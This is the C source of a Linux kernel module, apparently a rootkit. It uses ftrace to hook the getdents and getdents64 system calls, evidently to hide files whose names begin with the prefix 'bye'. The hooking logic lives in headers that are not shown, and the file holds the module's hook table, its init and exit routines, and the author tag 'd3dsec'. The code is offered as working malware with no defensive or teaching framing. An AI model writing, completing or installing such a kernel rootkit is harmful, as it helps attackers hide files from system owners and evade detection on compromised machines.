#include "sys_hook/getdents.h"
#include "sys_hook/getdents64.h"
#include "ftrace.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/string.h>
#include <linux/stddef.h>

#define PREFIX "bye"

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
};

static int __init lkm_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    return 0;
}

static void __exit lkm_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(lkm_init);
module_exit(lkm_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("d3dsec");
